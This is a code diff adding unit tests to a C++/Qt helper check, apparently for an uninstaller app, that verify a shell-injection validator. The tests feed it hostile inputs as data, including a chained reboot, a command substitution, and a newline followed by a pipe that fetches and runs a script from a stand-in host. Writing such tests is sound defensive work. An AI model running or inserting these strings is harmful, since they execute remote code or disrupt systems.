@@ -76,6 +76,38 @@ static int verifyHelpers() {
         std::fprintf(stderr, "scriptHasCommands missed rm\n");
         return 1;
     }
+    if (!commandIsShellSafe(QStringLiteral("apt-get purge -y wget"))) {
+        std::fprintf(stderr, "commandIsShellSafe rejected a plain command\n");
+        return 1;
+    }
+    if (!commandIsShellSafe(QStringLiteral("rm -rf '/home/user/App Support/x'"))) {
+        std::fprintf(stderr, "commandIsShellSafe rejected a quoted path with a space\n");
+        return 1;
+    }
+    if (!commandIsShellSafe(QStringLiteral("rm -f '/home/user/o'\\''brien'"))) {
+        std::fprintf(stderr, "commandIsShellSafe rejected an embedded quote\n");
+        return 1;
+    }
+    if (commandIsShellSafe(QStringLiteral("npm -g uninstall x; reboot #"))) {
+        std::fprintf(stderr, "commandIsShellSafe accepted an injected command\n");
+        return 1;
+    }
+    if (!commandIsShellSafe(QStringLiteral("rm -rf 'x'\\''; reboot; '\\'''"))) {
+        std::fprintf(stderr, "commandIsShellSafe rejected a shellQuote-escaped name\n");
+        return 1;
+    }
+    if (commandIsShellSafe(QStringLiteral("rm -rf /tmp/x\ncurl evil.sh | sh"))) {
+        std::fprintf(stderr, "commandIsShellSafe accepted a newline and a pipe\n");
+        return 1;
+    }
+    if (commandIsShellSafe(QStringLiteral("rm -rf $(id)"))) {
+        std::fprintf(stderr, "commandIsShellSafe accepted a command substitution\n");
+        return 1;
+    }
+    if (commandIsShellSafe(QString())) {
+        std::fprintf(stderr, "commandIsShellSafe accepted an empty command\n");
+        return 1;
+    }
     if (!QFile::exists(QStringLiteral(":/icons/appattic.png"))) {
         std::fprintf(stderr, "icon: embedded :/icons/appattic.png missing\n");
         return 1;
